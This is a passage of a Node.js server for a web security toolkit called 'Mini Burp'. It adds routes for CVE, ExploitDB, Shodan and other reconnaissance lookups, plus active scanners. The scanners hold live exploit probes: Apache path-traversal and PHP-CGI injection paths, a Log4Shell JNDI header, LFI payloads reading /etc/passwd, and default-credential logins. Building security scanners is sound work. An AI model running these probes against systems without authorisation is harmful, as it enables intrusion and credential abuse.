        const metrics = cve.metrics?.cvssMetricV31?.[0]?.cvssData || cve.metrics?.cvssMetricV2?.[0]?.cvssData || {};
        return {
          id: cve.id,
          description: cve.descriptions?.find(d => d.lang === "en")?.value || "",
          severity: metrics.baseSeverity || "UNKNOWN",
          score: metrics.baseScore || 0,
          published: cve.published,
          references: (cve.references || []).slice(0, 3).map(r => r.url),
        };
      });
      send(res, 200, { query, total: r.data?.totalResults || 0, cves });
    } catch (err) {
      send(res, 200, { error: `CVE lookup failed: ${err.message}` });
    }
    return;
  }

  // 2. GET /api/scanner/exploitdb?cve=CVE-2021-44228
  // Search ExploitDB via GitLab mirror API
  if (path === "/api/scanner/exploitdb") {
    const cve = parsed.searchParams.get("cve");
    const query = parsed.searchParams.get("query");
    const search = cve || query;
    if (!search) { send(res, 400, { error: "Missing cve or query param" }); return; }
    try {
      const r = await extFetch(`https://gitlab.com/api/v4/projects/exploit-database%2Fexploitdb/repository/tree?path=exploits&search=${encodeURIComponent(search)}&per_page=20`);
      const exploits = Array.isArray(r.data) ? r.data.map(e => ({
        name: e.name,
        path: e.path,
        url: `https://www.exploit-db.com/exploits/${e.name.match(/^(\d+)/)?.[1] || ""}`,
      })).filter(e => e.url.includes("/exploits/")) : [];
      // Fallback: search via exploit-db.com
      if (exploits.length === 0) {
        const r2 = await extFetch(`https://www.exploit-db.com/search?cve=${encodeURIComponent(search)}`).catch(() => null);
        send(res, 200, { search, exploits: [], note: "No direct API results. Try searching manually at exploit-db.com" });
      } else {
        send(res, 200, { search, exploits });
      }
    } catch (err) {
      send(res, 200, { error: `ExploitDB lookup failed: ${err.message}` });
    }
    return;
  }

  // 3. POST /api/scanner/nuclei — Run nuclei-style signature checks against a target
  if (path === "/api/scanner/nuclei" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
    const { target } = payload;
    if (!target) { send(res, 400, { error: "Missing target" }); return; }
    const host = target.replace(/^https?:\/\//, "").split("/")[0];
    if (await isBlockedTarget(host)) { send(res, 403, { error: "Target not allowed" }); return; }

    const baseUrl = target.startsWith("http") ? target : `https://${target}`;
    const results = [];

    // Signature-based checks (ported from Jaeles/Nuclei patterns)
    const signatures = [
      // Sensitive file detection
      { id: "exposed-env", name: ".env file exposed", path: "/.env", match: /(DB_|API_KEY|SECRET|PASSWORD|APP_KEY)/i, severity: "critical" },
      { id: "exposed-git", name: "Git directory exposed", path: "/.git/config", match: /\[core\]|\[remote/i, severity: "critical" },
      { id: "exposed-ds-store", name: "DS_Store exposed", path: "/.DS_Store", match: /Bud1/, severity: "low" },
      { id: "exposed-htpasswd", name: ".htpasswd exposed", path: "/.htpasswd", match: /\$apr1\$|\$2[ayb]\$|:{SHA}/, severity: "critical" },
      { id: "exposed-wp-config", name: "wp-config.php exposed", path: "/wp-config.php", match: /DB_NAME|DB_PASSWORD|AUTH_KEY/, severity: "critical" },
      { id: "exposed-phpinfo", name: "phpinfo() exposed", path: "/phpinfo.php", match: /phpinfo\(\)|PHP Version/, severity: "medium" },
      { id: "exposed-robots", name: "Robots.txt analysis", path: "/robots.txt", match: /Disallow:/, severity: "info", alwaysReport: true },
      { id: "exposed-sitemap", name: "Sitemap.xml found", path: "/sitemap.xml", match: /<urlset|<sitemapindex/, severity: "info", alwaysReport: true },
      // Admin panels
      { id: "admin-panel", name: "Admin panel detected", path: "/admin", match: /<form|login|admin|password/i, severity: "medium" },
      { id: "admin-phpmyadmin", name: "phpMyAdmin detected", path: "/phpmyadmin/", match: /phpMyAdmin|pma_/i, severity: "high" },
      { id: "admin-wp-login", name: "WordPress login", path: "/wp-login.php", match: /wp-login|wordpress/i, severity: "info" },
      // Server misconfigs
      { id: "server-status", name: "Apache server-status exposed", path: "/server-status", match: /Apache Server Status|Total Accesses/, severity: "high" },
      { id: "server-info", name: "Apache server-info exposed", path: "/server-info", match: /Server Information|Apache\//, severity: "high" },
      { id: "debug-enabled", name: "Debug mode enabled", path: "/", match: /Traceback|DEBUG = True|Laravel|stack trace|at .+\(.+\.js:\d+/i, severity: "medium", checkHeaders: true },
      // API endpoints
      { id: "graphql-exposed", name: "GraphQL endpoint exposed", path: "/graphql", match: /query|mutation|__schema|__type/i, severity: "medium" },
      { id: "swagger-exposed", name: "Swagger/OpenAPI docs exposed", path: "/swagger.json", match: /"swagger"|"openapi"/, severity: "medium" },
      { id: "swagger-ui", name: "Swagger UI exposed", path: "/swagger-ui/", match: /swagger-ui|Swagger UI/, severity: "medium" },
      { id: "api-docs", name: "API docs exposed", path: "/api-docs", match: /swagger|openapi|api/i, severity: "info" },
      // Backup files
      { id: "backup-sql", name: "SQL backup found", path: "/backup.sql", match: /INSERT INTO|CREATE TABLE|DROP TABLE/, severity: "critical" },
      { id: "backup-zip", name: "Backup archive found", path: "/backup.zip", match: /PK/, severity: "high", binary: true },
      // Cloud/Docker misconfigs
      { id: "docker-compose", name: "docker-compose.yml exposed", path: "/docker-compose.yml", match: /version:|services:|image:/, severity: "critical" },
      { id: "dockerfile", name: "Dockerfile exposed", path: "/Dockerfile", match: /FROM |RUN |COPY |EXPOSE /, severity: "high" },
      { id: "aws-credentials", name: "AWS credentials exposed", path: "/.aws/credentials", match: /aws_access_key_id|aws_secret_access_key/i, severity: "critical" },
    ];

    for (const sig of signatures) {
      try {
        const testUrl = baseUrl.replace(/\/$/, "") + sig.path;
        const r = await extFetch(testUrl).catch(() => null);
        if (!r) continue;
        const body = typeof r.data === "string" ? r.data : JSON.stringify(r.data);
        const matched = sig.match.test(body);
        if (matched || sig.alwaysReport) {
          results.push({
            id: sig.id,
            name: sig.name,
            severity: matched ? sig.severity : "info",
            path: sig.path,
            status: r.status,
            matched,
            snippet: matched ? body.substring(0, 200) : null,
          });
        }
        await new Promise(r => setTimeout(r, 150)); // Rate limiting
      } catch { /* skip failed checks */ }
    }

    send(res, 200, { target, checksRun: signatures.length, findings: results });
    return;
  }

  // 3.5. POST /api/scanner/jaeles — Active CVE vulnerability scanner (Jaeles-style)
  if (path === "/api/scanner/jaeles" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
    const { target } = payload;
    if (!target) { send(res, 400, { error: "Missing target" }); return; }
    const host = target.replace(/^https?:\/\//, "").split("/")[0];
    if (await isBlockedTarget(host)) { send(res, 403, { error: "Target not allowed" }); return; }

    const baseUrl = target.startsWith("http") ? target : `https://${target}`;
    const results = [];

    // Jaeles-style active vulnerability signatures
    const jaelesSignatures = [
      // ── CVE Exploits ──────────────────────────────────────────────────────
      // Apache Path Traversal (CVE-2021-41773 / CVE-2021-42013)
      { id: "CVE-2021-41773", name: "Apache Path Traversal", severity: "critical",
        path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        match: /root:.*:0:0/i, category: "cve" },
      { id: "CVE-2021-42013", name: "Apache Path Traversal v2", severity: "critical",
        path: "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        match: /root:.*:0:0/i, category: "cve" },
      // Spring4Shell (CVE-2022-22965)
      { id: "CVE-2022-22965", name: "Spring4Shell RCE", severity: "critical",
        path: "/?class.module.classLoader.DefaultAssertionStatus=nonsense",
        match: /400|Internal Server Error/i, checkStatus: [400, 500], category: "cve" },
      // Log4Shell probe (CVE-2021-44228)
      { id: "CVE-2021-44228", name: "Log4Shell (probe)", severity: "critical",
        path: "/", customHeaders: { "X-Api-Version": "${jndi:ldap://127.0.0.1/test}" },
        match: /.*/, checkStatus: [200, 302, 400, 500], detectByHeader: true, category: "cve" },
      // Nginx alias traversal
      { id: "nginx-alias-traversal", name: "Nginx Alias Traversal", severity: "high",
        path: "/static../etc/passwd",
        match: /root:.*:0:0/i, category: "cve" },
      // PHP-CGI argument injection (CVE-2012-1823)
      { id: "CVE-2012-1823", name: "PHP-CGI Argument Injection", severity: "critical",
        path: "/?-s",
        match: /<code>|<span|php.*source/i, category: "cve" },

      // ── Default Credentials ──────────────────────────────────────────────
      { id: "tomcat-default", name: "Tomcat Manager Default Creds", severity: "critical",
        path: "/manager/html",
        customHeaders: { "Authorization": "Basic dG9tY2F0OnRvbWNhdA==" }, // tomcat:tomcat
        match: /Tomcat Web Application Manager|Manager App/i, category: "creds" },
      { id: "tomcat-default2", name: "Tomcat Manager (admin:admin)", severity: "critical",
        path: "/manager/html",
        customHeaders: { "Authorization": "Basic YWRtaW46YWRtaW4=" }, // admin:admin
        match: /Tomcat Web Application Manager|Manager App/i, category: "creds" },
      { id: "jenkins-noauth", name: "Jenkins No Auth", severity: "critical",
        path: "/script",
        match: /Groovy script|Jenkins\.instance/i, category: "creds" },
      { id: "grafana-default", name: "Grafana Default Creds", severity: "critical",
        path: "/api/org",
        customHeaders: { "Authorization": "Basic YWRtaW46YWRtaW4=" }, // admin:admin
        match: /"id":\d+,"name"/i, category: "creds" },
      { id: "kibana-noauth", name: "Kibana No Auth", severity: "high",
        path: "/api/status",
        match: /"status":\{.*"overall"/i, category: "creds" },
      { id: "elasticsearch-noauth", name: "Elasticsearch No Auth", severity: "critical",
        path: "/_cat/indices",
        match: /green|yellow|red.*\d+.*\d+/i, category: "creds" },
      { id: "mongodb-http", name: "MongoDB HTTP Interface", severity: "critical",
        path: "/",
        customPort: 28017,
        match: /MongoDB|mongod/i, category: "creds" },

      // ── RCE / LFI / SSRF Tests ──────────────────────────────────────────
      // LFI via common params
      { id: "lfi-file-param", name: "LFI via ?file= param", severity: "critical",
        path: "/?file=../../../etc/passwd",
        match: /root:.*:0:0/i, category: "lfi" },
      { id: "lfi-page-param", name: "LFI via ?page= param", severity: "critical",
        path: "/?page=../../../etc/passwd",
        match: /root:.*:0:0/i, category: "lfi" },
      { id: "lfi-path-param", name: "LFI via ?path= param", severity: "critical",
        path: "/?path=../../../etc/passwd",
        match: /root:.*:0:0/i, category: "lfi" },
      { id: "lfi-include-param", name: "LFI via ?include= param", severity: "critical",
        path: "/?include=../../../etc/passwd",
        match: /root:.*:0:0/i, category: "lfi" },
      // Windows LFI
      { id: "lfi-windows", name: "LFI Windows (win.ini)", severity: "critical",
        path: "/?file=..\\..\\..\\windows\\win.ini",
        match: /\[fonts\]|\[extensions\]/i, category: "lfi" },

      // ── Technology-Specific ──────────────────────────────────────────────
      // WordPress REST API user enum
      { id: "wp-user-enum", name: "WordPress User Enumeration", severity: "medium",
        path: "/wp-json/wp/v2/users",
        match: /"id":\d+,"name":"[^"]+","slug"/i, category: "tech" },
      // WordPress debug.log
      { id: "wp-debug-log", name: "WordPress Debug Log Exposed", severity: "high",
        path: "/wp-content/debug.log",
        match: /PHP (Fatal|Warning|Notice|Deprecated)/i, category: "tech" },
      // Drupal user enum
      { id: "drupal-user-enum", name: "Drupal User Enumeration", severity: "medium",
        path: "/user/1",
        match: /member for|access denied/i, checkStatus: [200], category: "tech" },
      // Joomla config backup
      { id: "joomla-config", name: "Joomla Config Backup", severity: "critical",
        path: "/configuration.php.bak",
        match: /\$db|\$password|\$host/i, category: "tech" },
      // Git HEAD
      { id: "git-head", name: "Git HEAD Exposed", severity: "critical",
        path: "/.git/HEAD",
        match: /ref: refs\/heads\//i, category: "tech" },
      // Git packed-refs
      { id: "git-packed", name: "Git packed-refs Exposed", severity: "critical",
        path: "/.git/packed-refs",
        match: /refs\/heads|refs\/tags/i, category: "tech" },
      // Laravel debug
      { id: "laravel-debug", name: "Laravel Debug Mode", severity: "high",
        path: "/_ignition/health-check",
        match: /"can_execute_commands"/i, category: "tech" },
      // Symfony profiler
      { id: "symfony-profiler", name: "Symfony Profiler Exposed", severity: "high",
        path: "/_profiler/",
        match: /Symfony Profiler|sf-toolbar/i, category: "tech" },
      // Django debug
      { id: "django-debug", name: "Django Debug Info", severity: "high",
        path: "/admin/",
        match: /Django administration|DJANGO_SETTINGS_MODULE/i, category: "tech" },
      // Node.js Express stack trace
      { id: "express-stacktrace", name: "Express.js Stack Trace Leak", severity: "medium",
        path: "/%FF",
        match: /at Layer\.handle|at Function\.handle|URIError/i, category: "tech" },

      // ── HTTP Method Abuse ────────────────────────────────────────────────
      { id: "trace-enabled", name: "HTTP TRACE Enabled", severity: "medium",
        path: "/", method: "TRACE",
        match: /TRACE \/ HTTP/i, category: "method" },
      { id: "put-enabled", name: "HTTP PUT Enabled", severity: "high",
        path: "/test-put-method-check",
        method: "PUT", putBody: "test",
        match: /.*/, checkStatus: [200, 201, 204], category: "method" },

      // ── Info Disclosure ──────────────────────────────────────────────────
      { id: "actuator-health", name: "Spring Actuator Health", severity: "high",
        path: "/actuator/health",
        match: /"status"\s*:\s*"UP"/i, category: "info" },
      { id: "actuator-env", name: "Spring Actuator Env", severity: "critical",
        path: "/actuator/env",
        match: /"propertySources"|"activeProfiles"/i, category: "info" },
      { id: "actuator-beans", name: "Spring Actuator Beans", severity: "high",
        path: "/actuator/beans",
        match: /"beans"|"scope":"singleton"/i, category: "info" },
      { id: "haproxy-stats", name: "HAProxy Stats Exposed", severity: "high",
        path: "/haproxy?stats",
        match: /HAProxy Statistics|haproxy/i, category: "info" },
      { id: "metrics-prometheus", name: "Prometheus Metrics Exposed", severity: "medium",
        path: "/metrics",
        match: /process_cpu|http_requests_total|go_gc/i, category: "info" },
      { id: "env-json", name: "Environment Variables Exposed", severity: "critical",
        path: "/env.json",
        match: /DATABASE_URL|SECRET_KEY|API_KEY|PASSWORD/i, category: "info" },
      { id: "config-json", name: "Config.json Exposed", severity: "high",
        path: "/config.json",
        match: /"database"|"password"|"secret"|"apiKey"/i, category: "info" },
    ];

    for (const sig of jaelesSignatures) {
      try {
        const testUrl = baseUrl.replace(/\/$/, "") + sig.path;
        const fetchOpts = { headers: sig.customHeaders || {} };
        if (sig.method) fetchOpts.method = sig.method;
        if (sig.putBody) fetchOpts.body = sig.putBody;
        
        const r = await extFetch(testUrl, fetchOpts).catch(() => null);
        if (!r) continue;
        
        const body = typeof r.data === "string" ? r.data : JSON.stringify(r.data);
        let matched = false;

        if (sig.checkStatus) {
          matched = sig.checkStatus.includes(r.status) && sig.match.test(body);
        } else {
          matched = r.status === 200 && sig.match.test(body);
        }

        if (matched) {
          results.push({
            id: sig.id,
            name: sig.name,
            severity: sig.severity,
            category: sig.category,
            path: sig.path,
            status: r.status,
            snippet: body.substring(0, 150).replace(/[<>]/g, ""),
          });
        }
        await new Promise(r => setTimeout(r, 100)); // Rate limiting
      } catch { /* skip */ }
    }

    // Categorize results
    const byCat = {};
    for (const r of results) {
      if (!byCat[r.category]) byCat[r.category] = [];
      byCat[r.category].push(r);
    }

    send(res, 200, {
      target,
      engine: "jaeles",
      checksRun: jaelesSignatures.length,
      findings: results,
      byCategory: byCat,
      summary: {
        total: results.length,
        critical: results.filter(r => r.severity === "critical").length,
        high: results.filter(r => r.severity === "high").length,
        medium: results.filter(r => r.severity === "medium").length,
      },
    });
    return;
  }

  // 4. GET /api/scanner/shodan?ip=8.8.8.8&key=xxx
  if (path === "/api/scanner/shodan") {
    const ip = parsed.searchParams.get("ip") || parsed.searchParams.get("query");
    const key = parsed.searchParams.get("key") || process.env.SHODAN_API_KEY;
    if (!ip) { send(res, 400, { error: "Missing ip param" }); return; }
    if (!key) { send(res, 400, { error: "Missing Shodan API key. Set SHODAN_API_KEY env or pass ?key=" }); return; }
    try {
      const r = await extFetch(`https://api.shodan.io/shodan/host/${encodeURIComponent(ip)}?key=${key}`);
      if (r.status !== 200) { send(res, 200, { error: `Shodan error: ${JSON.stringify(r.data)}` }); return; }
      const d = r.data;
      send(res, 200, {
        ip: d.ip_str,
        hostnames: d.hostnames || [],
        org: d.org,
        os: d.os,
        country: d.country_name,
        city: d.city,
        ports: d.ports || [],
        vulns: d.vulns || [],
        services: (d.data || []).slice(0, 10).map(s => ({
          port: s.port,
          transport: s.transport,
          product: s.product,
          version: s.version,
          banner: (s.data || "").substring(0, 300),
        })),
      });
    } catch (err) {
      send(res, 200, { error: `Shodan lookup failed: ${err.message}` });
    }
    return;
  }

  // 5. GET /api/scanner/virustotal?domain=example.com&key=xxx
  if (path === "/api/scanner/virustotal") {
    const domain = parsed.searchParams.get("domain") || parsed.searchParams.get("ip");
    const key = parsed.searchParams.get("key") || process.env.VT_API_KEY;
    if (!domain) { send(res, 400, { error: "Missing domain param" }); return; }
    if (!key) { send(res, 400, { error: "Missing VirusTotal API key. Set VT_API_KEY env or pass ?key=" }); return; }
    try {
      const type = /^\d+\.\d+\.\d+\.\d+$/.test(domain) ? "ip_addresses" : "domains";
      const r = await extFetch(`https://www.virustotal.com/api/v3/${type}/${encodeURIComponent(domain)}`, {
        headers: { "x-apikey": key },
      });
      if (r.status !== 200) { send(res, 200, { error: `VirusTotal error: ${r.status}` }); return; }
      const attrs = r.data?.data?.attributes || {};
      send(res, 200, {
        domain,
        reputation: attrs.reputation,
        malicious: attrs.last_analysis_stats?.malicious || 0,
        suspicious: attrs.last_analysis_stats?.suspicious || 0,
        clean: attrs.last_analysis_stats?.harmless || 0,
        categories: attrs.categories || {},
        lastAnalysis: attrs.last_analysis_date,
        whois: attrs.whois ? attrs.whois.substring(0, 500) : null,
      });
    } catch (err) {
      send(res, 200, { error: `VirusTotal lookup failed: ${err.message}` });
    }
    return;
  }

  // 6. GET /api/scanner/urlscan?domain=example.com
  if (path === "/api/scanner/urlscan") {
    const domain = parsed.searchParams.get("domain");
    if (!domain) { send(res, 400, { error: "Missing domain param" }); return; }
    try {
      const r = await extFetch(`https://urlscan.io/api/v1/search/?q=domain:${encodeURIComponent(domain)}&size=5`);
      const results = (r.data?.results || []).map(r => ({
        url: r.page?.url,
        ip: r.page?.ip,
        server: r.page?.server,
        title: r.page?.title,
        status: r.page?.status,
        screenshot: r.screenshot,
        technologies: r.page?.technologies || [],
        date: r.task?.time,
      }));
      send(res, 200, { domain, results });
    } catch (err) {
      send(res, 200, { error: `URLScan lookup failed: ${err.message}` });
    }
    return;
  }

  // 7. GET /api/scanner/abuseipdb?ip=8.8.8.8&key=xxx
  if (path === "/api/scanner/abuseipdb") {
    const ip = parsed.searchParams.get("ip");
    const key = parsed.searchParams.get("key") || process.env.ABUSEIPDB_API_KEY;
    if (!ip) { send(res, 400, { error: "Missing ip param" }); return; }
    if (!key) { send(res, 400, { error: "Missing AbuseIPDB API key. Set ABUSEIPDB_API_KEY env or pass ?key=" }); return; }
    try {
      const r = await extFetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${encodeURIComponent(ip)}&maxAgeInDays=90&verbose`, {
        headers: { "Key": key, "Accept": "application/json" },
      });
      const d = r.data?.data || {};
      send(res, 200, {
        ip: d.ipAddress,
        isPublic: d.isPublic,
        abuseScore: d.abuseConfidenceScore,
        country: d.countryCode,
        isp: d.isp,
        domain: d.domain,
        totalReports: d.totalReports,
        lastReported: d.lastReportedAt,
        usageType: d.usageType,
      });
    } catch (err) {
      send(res, 200, { error: `AbuseIPDB lookup failed: ${err.message}` });
    }
    return;
  }

  // 8. GET /api/scanner/securitytrails?domain=example.com&key=xxx
  if (path === "/api/scanner/securitytrails") {
    const domain = parsed.searchParams.get("domain");
    const key = parsed.searchParams.get("key") || process.env.SECURITYTRAILS_API_KEY;
    if (!domain) { send(res, 400, { error: "Missing domain param" }); return; }
    if (!key) { send(res, 400, { error: "Missing SecurityTrails API key. Set SECURITYTRAILS_API_KEY env or pass ?key=" }); return; }
    try {
      // Get domain info + subdomains
      const [info, subs] = await Promise.all([
        extFetch(`https://api.securitytrails.com/v1/domain/${encodeURIComponent(domain)}`, { headers: { APIKEY: key } }),
        extFetch(`https://api.securitytrails.com/v1/domain/${encodeURIComponent(domain)}/subdomains?children_only=true`, { headers: { APIKEY: key } }),
      ]);
      send(res, 200, {
        domain,
        info: info.data,
        subdomains: (subs.data?.subdomains || []).slice(0, 50).map(s => `${s}.${domain}`),
      });
    } catch (err) {
      send(res, 200, { error: `SecurityTrails lookup failed: ${err.message}` });
    }
    return;
  }

  // 9. GET /api/scanner/censys?query=example.com&key=xxx&secret=xxx
  if (path === "/api/scanner/censys") {
    const query = parsed.searchParams.get("query");
    const apiId = parsed.searchParams.get("key") || process.env.CENSYS_API_ID;
    const apiSecret = parsed.searchParams.get("secret") || process.env.CENSYS_API_SECRET;
    if (!query) { send(res, 400, { error: "Missing query param" }); return; }
    if (!apiId || !apiSecret) { send(res, 400, { error: "Missing Censys API ID/Secret. Set CENSYS_API_ID and CENSYS_API_SECRET env vars" }); return; }
    try {
      const auth = Buffer.from(`${apiId}:${apiSecret}`).toString("base64");
      const r = await extFetch("https://search.censys.io/api/v2/hosts/search", {
        method: "POST",
        headers: {
          "Authorization": `Basic ${auth}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ q: query, per_page: 10 }),
      });
      const hits = (r.data?.result?.hits || []).map(h => ({
        ip: h.ip,
        services: (h.services || []).map(s => ({
          port: s.port,
          name: s.service_name,
          transport: s.transport_protocol,
          banner: s.banner,
        })),
        location: h.location,
        os: h.operating_system,
      }));
      send(res, 200, { query, total: r.data?.result?.total || 0, hits });
    } catch (err) {
      send(res, 200, { error: `Censys lookup failed: ${err.message}` });
    }
    return;
  }

  // 10. GET /api/scanner/crtsh?domain=example.com (enhanced crt.sh)
  if (path === "/api/scanner/crtsh") {
    const domain = parsed.searchParams.get("domain");
    if (!domain) { send(res, 400, { error: "Missing domain param" }); return; }
    try {
      const r = await extFetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`);
      const certs = Array.isArray(r.data) ? r.data : [];
      const subdomains = [...new Set(certs.map(c => c.name_value).flatMap(n => n.split("\n")).map(s => s.trim().toLowerCase()).filter(s => s.endsWith(domain) && !s.startsWith("*")))].sort();
      send(res, 200, {
        domain,
        totalCerts: certs.length,
        uniqueSubdomains: subdomains.length,
        subdomains,
        recentCerts: certs.slice(0, 10).map(c => ({
          issuer: c.issuer_name,
          commonName: c.common_name,
          notBefore: c.not_before,
          notAfter: c.not_after,
          names: c.name_value,
        })),
      });
    } catch (err) {
      send(res, 200, { error: `crt.sh lookup failed: ${err.message}` });
    }
    return;
  }

  // GET /api/scanner/list — list all available scanners
  if (path === "/api/scanner/list") {
    send(res, 200, {
      scanners: [
        { id: "cve", name: "CVE/NVD Search", endpoint: "/api/scanner/cve?query=", free: true, description: "Search NIST NVD for CVEs by keyword (software, version)" },
        { id: "exploitdb", name: "ExploitDB", endpoint: "/api/scanner/exploitdb?cve=", free: true, description: "Search for public exploits by CVE ID or keyword" },
        { id: "nuclei", name: "Nuclei Signatures", endpoint: "/api/scanner/nuclei (POST)", free: true, description: "Run 25+ nuclei-style checks: exposed files, admin panels, misconfigs, backup files" },
        { id: "crtsh", name: "crt.sh Enhanced", endpoint: "/api/scanner/crtsh?domain=", free: true, description: "Certificate Transparency subdomain enumeration" },
        { id: "urlscan", name: "URLScan.io", endpoint: "/api/scanner/urlscan?domain=", free: true, description: "Website screenshots, technologies, IP info" },
        { id: "shodan", name: "Shodan", endpoint: "/api/scanner/shodan?ip=&key=", free: false, description: "Port scanning, service detection, CVE mapping" },
        { id: "virustotal", name: "VirusTotal", endpoint: "/api/scanner/virustotal?domain=&key=", free: false, description: "Malware/phishing reputation analysis" },
        { id: "abuseipdb", name: "AbuseIPDB", endpoint: "/api/scanner/abuseipdb?ip=&key=", free: false, description: "IP abuse/spam/attack reports" },
        { id: "securitytrails", name: "SecurityTrails", endpoint: "/api/scanner/securitytrails?domain=&key=", free: false, description: "Deep DNS recon, historical records, subdomains" },
        { id: "censys", name: "Censys", endpoint: "/api/scanner/censys?query=&key=&secret=", free: false, description: "Certificate and service search engine" },
      ],
    });
    return;
  }

  // GET /health
  if (path === "/health") {
    const s = Object.fromEntries(allStats.all().map(r => [r.key, r.value]));
    const recentScans = db.prepare("SELECT host, open_ports, created_at FROM scan_history  ORDER BY id DESC LIMIT 5").all();
    const recentProxy = db.prepare("SELECT url, method, created_at FROM proxy_history ORDER BY id DESC LIMIT 5").all();
    const recentFuzz = db.prepare("SELECT url, payloads_count, created_at FROM fuzz_history  ORDER BY id DESC LIMIT 5").all();
    send(res, 200, {
      ok: true,
      uptime: Math.floor(process.uptime()),
      stats: s,
      recent: { scans: recentScans, proxy: recentProxy, fuzz: recentFuzz },
    });
    return;
  }
  // Serve static files from dist/
  if (req.method === "GET" && fs.existsSync(DIST_DIR)) {
    const safeSuffix = nodePath.normalize("/" + path.replace(/^\/+/, ""));
    let filePath = nodePath.join(DIST_DIR, safeSuffix);
    // prevent path traversal
    if (!filePath.startsWith(DIST_DIR + nodePath.sep) && filePath !== DIST_DIR) { send(res, 403, { error: "Forbidden" }); return; }
    // Fix false positives: Return 404 for sensitive files/admin paths instead of serving SPA index
    if (/^\/(wp-admin|wp-login\.php|\.env|\.git|\.aws|\.ssh|config\.php|xmlrpc\.php|wp-json|readme\.html)/i.test(path)) {
      if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
        send(res, 404, { error: "Not found" });
        return;
      }
    }
    if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
      filePath = nodePath.join(DIST_DIR, "index.html");
    }
    const ext = nodePath.extname(filePath).toLowerCase();
    const mime = {
      ".html": "text/html", ".js": "application/javascript", ".css": "text/css",
      ".png": "image/png", ".svg": "image/svg+xml", ".ico": "image/x-icon",
      ".json": "application/json", ".woff2": "font/woff2"
    }[ext] || "application/octet-stream";
    res.writeHead(200, { "Content-Type": mime });
    fs.createReadStream(filePath).pipe(res);
    return;
  }
  send(res, 404, { error: "Not found", routes: ["/proxy?url=", "/request (POST)", "/portscan?host=", "/headers?url=", "/fuzz (POST)", "/health"] });
}).listen(PORT, "0.0.0.0", () => {
  console.log(`✅ Mini Burp running on port ${PORT}`);
  console.log(`   GET  /proxy?url=https://example.com`);
  console.log(`   POST /request  { url, method, headers, body }`);
  console.log(`   GET  /portscan?host=example.com`);
  console.log(`   GET  /headers?url=https://example.com`);
});
process.on("SIGTERM", () => process.exit(0));
process.on("SIGINT", () => process.exit(0));